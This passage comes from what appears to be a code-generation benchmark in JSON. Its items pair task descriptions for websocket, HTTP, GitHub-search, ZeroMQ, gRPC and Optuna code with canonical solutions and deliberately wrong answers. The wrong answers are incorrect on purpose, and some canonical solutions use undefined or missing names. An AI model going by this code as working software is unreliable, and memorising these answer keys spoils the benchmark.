    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import asyncio\nimport websockets\nimport json\n\nasync def handle_connection(websocket, path):\n    async for message in websocket:\n        try:\n            data = json.loads(message)\n            function = data.get(\"function\")\n            args = data.get(\"args\", [])\n            \n            if function == \"echo\":\n                response = {\"function\": \"echo\", \"args\": args}\n                await websocket.send(json.dumps(response))\n            elif function == \"ask\":\n                response = {\"function\": \"ask\", \"args\": [\"What is your name?\"]}\n                await websocket.send(json.dumps(response))\n            elif function == \"throw\":\n                response = {\"function\": \"throw\", \"args\": [\"Error: Something went wrong.\"]}\n                await websocket.send(json.dumps(response))\n            else:\n                response = {\"function\": \"error\", \"args\": [\"Unknown function.\"]}\n                await websocket.send(json.dumps(response))\n        except json.JSONDecodeError:\n            await websocket.send(json.dumps({\"function\": \"error\", \"args\": [\"Invalid JSON message.\"]}))\n\ndef start_websocket_server():\n    print(\"Starting WebSocket server...\")\n    start_server = websockets.serve(handle_connection, \"localhost\", 8765)\n    asyncio.get_event_loop().run_until_complete(start_server)\n    asyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 467,
    "Instruction": "Task Description: Create a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs specified operations (echo, ask, or throw), and returns appropriate responses. The start_websocket_server function initializes and starts the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, maintaining the WebSocket connection and processing messages)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": str (required, specifies operation: \"echo\", \"ask\", or \"throw\"),\n  \"args\": list (arguments for the specified function)\n}\n\nThe server returns JSON responses with either:\n- A \"return\" field containing the result for successful operations\n- A \"throw\" field containing error messages for failures",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "import websockets\nimport asyncio\nimport json\n\nasync def handler(websocket, path):\n    async for message in websocket:\n        try:\n            data = json.loads(message)\n            function = data.get(\"function\")\n            args = data.get(\"args\", [])\n            if function == \"echo\":\n                response = {\"return\": args}\n            elif function == \"ask\":\n                response = {\"return\": \"Please provide more information.\"}\n            elif function == \"throw\":\n                response = {\"throw\": \"An error occurred.\"}\n            else:\n                response = {\"throw\": \"Unknown function.\"}\n            await websocket.send(json.dumps(response))\n        except json.JSONDecodeError:\n            await websocket.send(json.dumps({\"throw\": \"Invalid JSON format.\"}))\n\nasync def start_websocket_server():\n    async with websockets.serve(handler, \"localhost\", 8765):\n        await asyncio.Future()\n\nif __name__ == \"__main__\":\n    asyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 47,
    "Instruction": "Task Description: Create an asynchronous HTTP client function that can send various types of HTTP requests (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS) and return the response.\n\nFunction Description: The function `make_http_request` is an asynchronous HTTP client that sends HTTP requests using the `httpx` library. It supports multiple HTTP methods and can handle both raw content and JSON data for POST requests. The function uses a context manager to ensure proper resource management and returns the HTTP response object.\n\nInput:\n- `url`: str - The target URL for the HTTP request.\n- `method`: str (optional, default=\"GET\") - The HTTP method to use (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS).\n- `content`: typing.Optional[bytes] (optional) - Raw bytes content to send in the request body (for POST, PUT, PATCH).\n- `json`: typing.Optional[dict] (optional) - JSON data to send in the request body (for POST).\n- `headers`: typing.Optional[dict] (optional) - Custom headers to include in the request.\n\nOutput:\n- `httpx.Response` - The HTTP response object containing status code, headers, and response body.",
    "Canonical_solution": "import httpx\nimport typing\nfrom datetime import timedelta\n\nasync def make_http_request(url: str, method: str = \"GET\", content: typing.Optional[bytes] = None, json: typing.Optional[dict] = None, headers: typing.Optional[dict] = None) -> httpx.Response:\n    async with httpx.AsyncClient() as client:\n        if method == \"GET\":\n            response = await client.get(url)\n        elif method == \"POST\":\n            if content:\n                response = await client.post(url, content=content)\n            elif json:\n                response = await client.post(url, json=json)\n        elif method == \"PUT\":\n            response = await client.put(url, content=content)\n        elif method == \"DELETE\":\n            response = await client.delete(url)\n        elif method == \"PATCH\":\n            response = await client.patch(url, content=content)\n        elif method == \"HEAD\":\n            response = await client.head(url)\n        elif method == \"OPTIONS\":\n            response = await client.options(url)\n        \n        return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "import httpx\nfrom typing import Optional, Dict, Any\n\nasync def make_http_request(\n    url: str,\n    method: str = \"GET\",\n    content: Optional[bytes] = None,\n    json: Optional[Dict[str, Any]] = None,\n    headers: Optional[Dict[str, str]] = None\n) -> httpx.Response:\n    async with httpx.AsyncClient() as client:\n        if method in (\"POST\", \"PUT\", \"PATCH\"):\n            if json is not None:\n                data = json.dumps(json)\n                headers = headers or {}\n                headers[\"Content-Type\"] = \"application/json\"\n            else:\n                data = content\n        else:\n            data = None\n        response = await client.request(method, url, data=data, headers=headers)\n        return response"
  },
  {
    "Task_id": 48,
    "Instruction": "Task Description: Implement an asynchronous function to search GitHub issues using the GitHub API, handling authentication and response processing.\n\nFunction Description: The function `search_github_issues` asynchronously searches for GitHub issues based on a query string, with options to specify the repository, number of results, and an optional API token. It handles authentication, sends an HTTP GET request to the GitHub API, processes the response, and returns a formatted summary of the issues found.\n\nInput:\n- `query`: str - The search query string for GitHub issues.\n- `repo`: str (optional, default=\"prefecthq/prefect\") - The repository to search in, formatted as \"owner/repo\".\n- `n`: int (optional, default=3) - The maximum number of issues to return.\n- `api_token`: Optional[str] (optional, default=None) - The GitHub API token for authentication. If not provided, the function attempts to retrieve it from various sources.\n\nOutput:\n- str - A formatted string summarizing the found GitHub issues, including their titles, URLs, and truncated bodies. Returns \"No issues found.\" if no issues match the query.",
    "Canonical_solution": "import os\nimport httpx\nfrom typing import Optional\n\nasync def get_token() -> str:\n    try:\n        from prefect.blocks.system import Secret\n        return (await Secret.load(name=\"github-token\")).get()  # type: ignore\n    except (ImportError, ValueError) as exc:\n        getattr(get_logger(\"marvin\"), \"debug_kv\")(\n            (\n                \"Prefect Secret for GitHub token not retrieved. \"\n                f\"{exc.__class__.__name__}: {exc}\"\n                \"red\"\n            ),\n        )\n\n    try:\n        return getattr(marvin.settings, \"github_token\")\n    except AttributeError:\n        pass\n\n    if token := os.environ.get(\"MARVIN_GITHUB_TOKEN\", \"\"):\n        return token\n\n    raise RuntimeError(\"GitHub token not found\")\n\nasync def search_github_issues(\n    query: str,\n    repo: str = \"prefecthq/prefect\",\n    n: int = 3,\n    api_token: Optional[str] = None,\n) -> str:\n    headers = {\"Accept\": \"application/vnd.github.v3+json\"}\n    headers[\"Authorization\"] = f\"Bearer {api_token or await get_token()}\"\n\n    async with httpx.AsyncClient() as client:\n        response = await client.get(\n            \"https://api.github.com/search/issues\",\n            headers=headers,\n            params={\n                \"q\": query if \"repo:\" in query else f\"repo:{repo} {query}\",\n                \"order\": \"desc\",\n                \"per_page\": n,\n            },\n        )\n        response.raise_for_status()\n\n    issues_data = response.json()[\"items\"]\n\n    for issue in issues_data:\n        if not issue[\"body\"]:\n            continue\n        issue[\"body\"] = slice_tokens(issue[\"body\"], 1000)\n\n    issues = [GitHubIssue(**issue) for issue in issues_data]\n\n    summary = \"\\n\\n\".join(\n        f\"{issue.title} ({issue.html_url}):\\n{issue.body}\" for issue in issues\n    )\n    if not summary.strip():\n        return \"No issues found.\"\n    return summary",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "import os\nimport asyncio\nimport aiohttp\nimport json\n\nasync def search_github_issues(query, repo=None, n=3, api_token=None):\n    if api_token is None:\n        api_token = os.environ.get('GITHUB_TOKEN')\n    if repo:\n        query_str = f\"{query} repo:{repo}\"\n    else:\n        query_str = query\n    url = \"https://api.github.com/search/issues\"\n    params = {'q': query_str, 'per_page': n}\n    headers = {}\n    if api_token:\n        headers['Authorization'] = f\"Bearer {api_token}\"\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url, params=params, headers=headers) as response:\n            if response.status != 200:\n                return \"No issues found.\"\n            data = await response.json()\n    issues = data.get('items', [])\n    if not issues:\n        return \"No issues found.\"\n    summary = \"\"\n    for i, issue in enumerate(issues, 1):\n        title = issue.get('title', 'No title')\n        url = issue.get('html_url', 'No URL')\n        body = issue.get('body', '')\n        body_trunc = body[:100] + ('...' if len(body) > 100 else '')\n        summary += f\"{i}. {title}\\nURL: {url}\\nBody: {body_trunc}\\n\\n\"\n    return summary"
  },
  {
    "Task_id": 481,
    "Instruction": "Task Description: Implement a multi-process data processing system using ZeroMQ for inter-process communication, where worker processes apply a mapping function to incoming data points and return the results.\n\nClass Description: MultiProcessMapDataZMQ is a class that manages multiple worker processes for parallel data processing using ZeroMQ's REQ/REP pattern. It handles process creation, communication, and data serialization.\n\nAttributes:\n- ds: [Any] - The data source to be processed\n- num_proc: [int] - Number of worker processes to create\n- map_func: [callable] - Function to apply to each data point\n- _buffer_size: [int] - High water mark for ZeroMQ sockets\n- _strict: [bool] - Whether to enforce strict processing rules\n- _procs: [list] - List of worker processes\n- context: [zmq.Context] - ZeroMQ context\n- socket: [zmq.Socket] - Main DEALER socket for communication\n- _proc_ids: [list] - List of process identifiers\n\nMethods:\n- __init__(ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False) -> None - Initializes the multi-process mapper with configuration parameters\n- reset_state() -> None - Sets up ZeroMQ context, sockets, and starts worker processes\n- _create_worker(id, pipename, hwm) -> _Worker - Creates a worker process instance\n- _send(dp) -> None - Sends a data point to workers\n- _recv() -> Any - Receives processed data from workers\n\nNested _Worker Class:\n- __init__(identity, map_func, pipename, hwm) -> None - Initializes a worker process\n- run() -> None - Worker's main loop that processes incoming data using REQ/REP pattern",
    "Canonical_solution": "import zmq\nimport multiprocessing as mp\nfrom ..utils.serialize import dumps_once as dumps, loads_once as loads\nfrom ..utils.concurrency import enable_death_signal\n\nclass MultiProcessMapDataZMQ:\n    class _Worker(mp.Process):\n        def __init__(self, identity, map_func, pipename, hwm):\n            super(MultiProcessMapDataZMQ._Worker, self).__init__()\n            self.identity = identity\n            self.map_func = map_func\n            self.pipename = pipename\n            self.hwm = hwm\n\n        def run(self):\n            enable_death_signal(_warn=self.identity == b'0')\n            ctx = zmq.Context()\n            socket = ctx.socket(zmq.REP)\n            socket.setsockopt(zmq.IDENTITY, self.identity)\n            socket.set_hwm(self.hwm)\n            socket.connect(self.pipename)\n\n            while True:\n                dp = loads(socket.recv(copy=False))\n                dp = self.map_func(dp)\n                socket.send(dumps(dp), copy=False)\n\n    def __init__(self, ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False):\n        self.ds = ds\n        self.num_proc = num_proc\n        self.map_func = map_func\n        self._buffer_size = buffer_size\n        self._strict = strict\n        self._procs = []\n\n    def reset_state(self):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.DEALER)\n        self.socket.set_hwm(self._buffer_size * 2)\n        pipename = _get_pipe_name('dataflow-map')\n        _bind_guard(self.socket, pipename)\n\n        self._proc_ids = [u'{}'.format(k).encode('utf-8') for k in range(self.num_proc)]\n        worker_hwm = int(self._buffer_size * 2 // self.num_proc)\n        self._procs = [self._create_worker(self._proc_ids[k], pipename, worker_hwm)\n                       for k in range(self.num_proc)]\n\n        self._start_processes()\n\n    def _create_worker(self, id, pipename, hwm):\n        return MultiProcessMapDataZMQ._Worker(id, self.map_func, pipename, hwm)\n\n    def _send(self, dp):\n        msg = [b\"\", dumps(dp)]\n        self.socket.send_multipart(msg, copy=False)\n\n    def _recv(self):\n        msg = self.socket.recv_multipart(copy=False)\n        dp = loads(msg[1])\n        return dp",
    "Code_level": "Class-level",
    "FSMID_for_test": 87,
    "wrong_result": "import zmq\nfrom multiprocessing import Process\n\nclass MultiProcessMapDataZMQ:\n    def __init__(self, ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False):\n        self.ds = ds\n        self.num_proc = num_proc\n        self.map_func = map_func\n        self._buffer_size = buffer_size\n        self._strict = strict\n        self._procs = []\n        self.context = None\n        self.socket = None\n        self._proc_ids = []\n\n    def reset_state(self):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.DEALER)\n        self.socket.set_hwm(self._buffer_size)\n        self.socket.bind('inproc://workers')\n        self._proc_ids = []\n        for i in range(self.num_proc):\n            worker = self._create_worker(i, f'worker_{i}', self._buffer_size)\n            self._procs.append(worker)\n            self._proc_ids.append(i)\n\n    def _create_worker(self, id, pipename, hwm):\n        class _Worker:\n            def __init__(self, identity, map_func, pipename, hwm):\n                self.identity = identity\n                self.map_func = map_func\n                self.pipename = pipename\n                self.hwm = hwm\n\n            def run(self):\n                sock = self.context.socket(zmq.REP)\n                sock.connect('inproc://workers')\n                while True:\n                    msg = sock.recv()\n                    result = self.map_func(msg)\n                    sock.send(result)\n\n        p = Process(target=_Worker.run, args=(id, self.map_func, self.pipename, self.hwm))\n        p.start()\n        return p\n\n    def _send(self, dp):\n        self.socket.send(dp)\n\n    def _recv(self):\n        return self.socket.recv()"
  },
  {
    "Task_id": 482,
    "Instruction": "Task Description: Create a ZeroMQ Publisher (PUB) handler class that can send metrics over a TCP connection using the PUB/SUB pattern.\n\nClass Description: The `zmqHandler` class is a ZeroMQ-based publisher that inherits from a base `Handler` class. It establishes a PUB socket to publish metrics to subscribers. The class handles socket creation, binding, and message sending.\n\nAttributes:\n- context: [zmq.Context] - ZeroMQ context for managing sockets\n- socket: [zmq.Socket] - PUB socket for sending messages\n- port: [int] - Port number to bind the socket to\n- enabled: [bool] - Flag indicating if the handler is operational (inherited)\n- config: [dict] - Configuration dictionary (inherited)\n- log: [Logger] - Logger instance (inherited)\n\nMethods:\n- __init__(config: dict) -> None - Constructor that initializes the handler with configuration\n  Input: config - Dictionary containing configuration parameters\n  Output: None\n\n- _bind() -> None - Internal method to create and bind the PUB socket\n  Input: None\n  Output: None\n\n- process(metric: Any) -> None - Publishes a metric through the PUB socket\n  Input: metric - The data to be published (converted to string)\n  Output: None",
    "Canonical_solution": "import zmq\nfrom Handler import Handler\n\nclass zmqHandler(Handler):\n    def __init__(self, config=None):\n        Handler.__init__(self, config)\n        \n        if not zmq:\n            self.log.error('zmq import failed. Handler disabled')\n            self.enabled = False\n            return\n\n        self.context = None\n        self.socket = None\n        self.port = int(self.config['port'])\n        self._bind()\n\n    def _bind(self):\n        if not zmq:\n            return\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.PUB)\n        self.socket.bind(\"tcp://*:%i\" % self.port)\n\n    def process(self, metric):\n        if not zmq:\n            return\n        self.socket.send(\"%s\" % str(metric))",
    "Code_level": "Class-level",
    "FSMID_for_test": 88,
    "wrong_result": "class zmqHandler(Handler):\n    def __init__(self, config: dict) -> None:\n        super().__init__(config)\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.PUB)\n        self.port = config['port']\n        self._bind()\n\n    def _bind(self) -> None:\n        self.socket.bind(f\"tcp://*:{self.port}\")\n\n    def process(self, metric: Any) -> None:\n        if self.enabled:\n            self.socket.send_string(str(metric))"
  },
  {
    "Task_id": 493,
    "Instruction": "Task Description: Implement a gRPC server class in Python that handles various types of requests (prompts, tensors, examples) for a distributed node service, with health check capability.\n\nClass Description: GRPCServer is a gRPC server implementation that processes different types of requests for a node service, including prompt processing, tensor processing, and example processing with training capabilities. It manages server lifecycle and handles large message sizes.\n\nAttributes:\n- node: [Any] - The node instance that processes the actual requests\n- host: [str] - The host address where the server will run\n- port: [int] - The port number where the server will listen\n- server: [grpc.aio.Server] - The gRPC server instance (initialized as None)\n\nMethods:\n- start() -> None - Initializes and starts the gRPC server with thread pool executor and configured message size limits\n- stop() -> None - Gracefully stops the gRPC server with a 5-second grace period\n- SendPrompt(request: [node_service_pb2.PromptRequest], context: [grpc.aio.ServicerContext]) -> [node_service_pb2.Tensor] - Processes prompt requests and returns tensor results\n- SendTensor(request: [node_service_pb2.TensorRequest], context: [grpc.aio.ServicerContext]) -> [node_service_pb2.Tensor] - Processes tensor requests and returns tensor results\n- SendExample(request: [node_service_pb2.ExampleRequest], context: [grpc.aio.ServicerContext]) -> [node_service_pb2.Loss] - Processes training examples and returns loss/gradients\n- HealthCheck(request: [node_service_pb2.HealthCheckRequest], context: [grpc.aio.ServicerContext]) -> [node_service_pb2.HealthCheckResponse] - Provides health check status of the server",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nimport numpy as np\nfrom asyncio import CancelledError\nfrom . import node_service_pb2\nfrom . import node_service_pb2_grpc\n\nclass GRPCServer(node_service_pb2_grpc.NodeServiceServicer):\n    def __init__(self, node, host: str, port: int):\n        self.node = node\n        self.host = host\n        self.port = port\n        self.server = None\n\n    async def start(self) -> None:\n        self.server = grpc.aio.server(\n            futures.ThreadPoolExecutor(max_workers=10),\n            options=[\n                (\"grpc.max_metadata_size\", 32*1024*1024),\n                (\"grpc.max_send_message_length\", 128*1024*1024),\n                (\"grpc.max_receive_message_length\", 128*1024*1024),\n            ],\n        )\n        node_service_pb2_grpc.add_NodeServiceServicer_to_server(self, self.server)\n        listen_addr = f\"{self.host}:{self.port}\"\n        self.server.add_insecure_port(listen_addr)\n        await self.server.start()\n\n    async def stop(self) -> None:\n        if self.server:\n            try:\n                await self.server.stop(grace=5)\n                await self.server.wait_for_termination()\n            except CancelledError:\n                pass\n\n    async def SendPrompt(self, request, context):\n        shard = Shard(\n            model_id=request.shard.model_id,\n            start_layer=request.shard.start_layer,\n            end_layer=request.shard.end_layer,\n            n_layers=request.shard.n_layers,\n        )\n        prompt = request.prompt\n        request_id = request.request_id\n        result = await self.node.process_prompt(shard, prompt, request_id)\n        tensor_data = result.tobytes() if result is not None else None\n        return node_service_pb2.Tensor(tensor_data=tensor_data, shape=result.shape, dtype=str(result.dtype)) if result is not None else node_service_pb2.Tensor()\n\n    async def SendTensor(self, request, context):\n        shard = Shard(\n            model_id=request.shard.model_id,\n            start_layer=request.shard.start_layer,\n            end_layer=request.shard.end_layer,\n            n_layers=request.shard.n_layers,\n        )\n        tensor = np.frombuffer(request.tensor.tensor_data, dtype=np.dtype(request.tensor.dtype)).reshape(request.tensor.shape)\n        request_id = request.request_id\n        result = await self.node.process_tensor(shard, tensor, request_id)\n        tensor_data = result.tobytes() if result is not None else None\n        return node_service_pb2.Tensor(tensor_data=tensor_data, shape=result.shape, dtype=str(result.dtype)) if result is not None else node_service_pb2.Tensor()\n\n    async def SendExample(self, request, context):\n        shard = Shard(\n            model_id=request.shard.model_id,\n            start_layer=request.shard.start_layer,\n            end_layer=request.shard.end_layer,\n            n_layers=request.shard.n_layers,\n        )\n        example = np.frombuffer(request.example.tensor_data, dtype=np.dtype(request.example.dtype)).reshape(request.example.shape)\n        target = np.frombuffer(request.target.tensor_data, dtype=np.dtype(request.target.dtype)).reshape(request.target.shape)\n        length = np.frombuffer(request.length.tensor_data, dtype=np.dtype(request.length.dtype)).reshape(request.length.shape)\n        train = request.train\n        request_id = request.request_id\n\n        if train and not shard.is_first_layer():\n            loss, grad = await self.node.process_example(shard, example, target, length, train, request_id)\n            tensor_data = grad.tobytes()\n            grad_tensor = node_service_pb2.Tensor(tensor_data=tensor_data, shape=grad.shape, dtype=str(grad.dtype))\n            return node_service_pb2.Loss(loss=loss, grads=grad_tensor)\n        else:\n            loss = await self.node.process_example(shard, example, target, length, train, request_id)\n            return node_service_pb2.Loss(loss=loss, grads=None)\n\n    async def HealthCheck(self, request, context):\n        return node_service_pb2.HealthCheckResponse(is_healthy=True)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "import grpc.aio\nimport asyncio\nimport node_service_pb2\nimport node_service_pb2_grpc\n\nclass GRPCServer:\n    def __init__(self, node, host, port):\n        self.node = node\n        self.host = host\n        self.port = port\n        self.server = None\n\n    async def start(self):\n        self.server = grpc.aio.server(\n            options=[\n                ('max_message_length', 1024 * 1024 * 1024),\n                ('max_send_message_length', 1024 * 1024 * 1024),\n                ('max_receive_message_length', 1024 * 1024 * 1024),\n            ]\n        )\n        self.server.add_insecure_port(f\"{self.host}:{self.port}\")\n        node_service_pb2_grpc.add_GRPCServerServicer_to_server(self, self.server)\n        await self.server.start()\n\n    def stop(self):\n        self.server.stop(5)\n\n    def SendPrompt(self, request, context):\n        tensor = self.node.process_prompt(request)\n        return node_service_pb2.Tensor(data=tensor)\n\n    def SendTensor(self, request, context):\n        tensor = self.node.process_tensor(request)\n        return node_service_pb2.Tensor(data=tensor)\n\n    def SendExample(self, request, context):\n        loss = self.node.process_example(request)\n        return node_service_pb2.Loss(value=loss)\n\n    def HealthCheck(self, request, context):\n        return node_service_pb2.HealthCheckResponse(status=\"SERVING\")"
  },
  {
    "Task_id": 495,
    "Instruction": "Task Description: Create a function to set up and tear down a gRPC server with configurable interceptors and thread pool workers.\n\nFunction Description: The function `_set_up` initializes and starts a gRPC server with optional interceptors, while `_tear_down` gracefully stops the server. The server is configured to handle gRPC requests concurrently using a thread pool.\n\nInput:\n- `interceptors` (Optional[List[grpc.ServerInterceptor]]): A list of gRPC server interceptors for request/response processing. Defaults to None.\n- `server` (grpc.Server): The gRPC server instance to be stopped (for `_tear_down`).\n\nOutput:\n- `_set_up` returns the initialized and started `grpc.Server` instance.\n- `_tear_down` has no return value (stops the server).",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom typing import List, Optional\n\ndef _set_up(interceptors: Optional[List[grpc.ServerInterceptor]] = None):\n    server = grpc.server(\n        futures.ThreadPoolExecutor(max_workers=2),\n        interceptors=interceptors,\n    )\n    add_gRPCTestServiceServicer_to_server(TestService(), server)\n    server.add_insecure_port(\"[::]:{}\".format(PORT))\n    server.start()\n    return server\n\ndef _tear_down(server: grpc.Server):\n    server.stop(None)",
    "Code_level": "Function-level",
    "FSMID_for_test": 74,
    "wrong_result": "import grpc\nfrom concurrent import futures\n\ndef _set_up(interceptors=None):\n    server = grpc.server(futures.ThreadPoolExecutor(max_workers=4))\n    if interceptors:\n        for interceptor in interceptors:\n            server.add_interceptor(interceptor)\n    server.start()\n    return server\n\ndef _tear_down(server):\n    server.stop()"
  },
  {
    "Task_id": 498,
    "Instruction": "Task Description: Implement a gRPC server for Optuna storage proxy service that handles study and trial management operations.\n\nClass Description: OptunaStorageProxyService is a gRPC servicer class that implements the StorageService interface, providing methods to manage Optuna studies and trials through a gRPC server. It acts as a proxy between gRPC clients and the underlying Optuna storage backend.\n\nAttributes:\n- _backend: BaseStorage - The underlying Optuna storage implementation\n- _lock: threading.Lock - A lock for thread-safe operations\n\nMethods:\n- CreateNewStudy(request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply - Creates a new study with given directions and name\n- DeleteStudy(request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply - Deletes a study with the given ID\n- SetStudyUserAttribute(request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply - Sets a user attribute for a study\n- GetStudyIdFromName(request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply - Gets study ID from study name\n- GetStudyNameFromId(request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply - Gets study name from study ID\n- GetAllStudies(request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply - Gets all studies in the storage\n- CreateNewTrial(request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply - Creates a new trial in a study\n- SetTrialParameter(request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply - Sets parameters for a trial\n- GetTrial(request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply - Gets trial details\n- GetAllTrials(request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply - Gets all trials for a study with optional state filtering",
    "Canonical_solution": "from concurrent.futures import ThreadPoolExecutor\nimport grpc\nfrom optuna.storages._grpc.grpc_imports import api_pb2_grpc\nfrom optuna.storages._grpc.grpc_imports import api_pb2\nfrom optuna.storages._grpc.grpc_imports import StorageServiceServicer\nfrom optuna.storages import BaseStorage\nfrom optuna._experimental import experimental_func\nimport logging\n\n_logger = logging.get_logger(__name__)\n\nclass OptunaStorageProxyService(StorageServiceServicer):\n    def __init__(self, storage: BaseStorage) -> None:\n        self._backend = storage\n        self._lock = threading.Lock()\n\n    def CreateNewStudy(self, request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply:\n        directions = [\n            StudyDirection.MINIMIZE if d == api_pb2.MINIMIZE else StudyDirection.MAXIMIZE\n            for d in request.directions\n        ]\n        study_name = request.study_name\n\n        try:\n            study_id = self._backend.create_new_study(directions=directions, study_name=study_name)\n        except DuplicatedStudyError as e:\n            context.abort(code=grpc.StatusCode.ALREADY_EXISTS, details=str(e))\n        return api_pb2.CreateNewStudyReply(study_id=study_id)\n\n    def DeleteStudy(self, request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply:\n        study_id = request.study_id\n        try:\n            self._backend.delete_study(study_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.DeleteStudyReply()\n\n    def SetStudyUserAttribute(self, request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply:\n        try:\n            self._backend.set_study_user_attr(\n                request.study_id, request.key, json.loads(request.value)\n            )\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.SetStudyUserAttributeReply()\n\n    def GetStudyIdFromName(self, request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply:\n        try:\n            study_id = self._backend.get_study_id_from_name(request.study_name)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetStudyIdFromNameReply(study_id=study_id)\n\n    def GetStudyNameFromId(self, request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply:\n        study_id = request.study_id\n        try:\n            name = self._backend.get_study_name_from_id(study_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        assert name is not None\n        return api_pb2.GetStudyNameFromIdReply(study_name=name)\n\n    def GetAllStudies(self, request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply:\n        studies = self._backend.get_all_studies()\n        return api_pb2.GetAllStudiesReply(\n            studies=[\n                api_pb2.Study(\n                    study_id=study._study_id,\n                    study_name=study.study_name,\n                    directions=[\n                        api_pb2.MINIMIZE if d == StudyDirection.MINIMIZE else api_pb2.MAXIMIZE\n                        for d in study.directions\n                    ],\n                    user_attributes={\n                        key: json.dumps(value) for key, value in study.user_attrs.items()\n                    },\n                    system_attributes={\n                        key: json.dumps(value) for key, value in study.system_attrs.items()\n                    },\n                )\n                for study in studies\n            ]\n        )\n\n    def CreateNewTrial(self, request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply:\n        study_id = request.study_id\n        template_trial = None\n        if not request.template_trial_is_none:\n            template_trial = _from_proto_trial(request.template_trial)\n\n        try:\n            trial_id = self._backend.create_new_trial(study_id, template_trial)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return 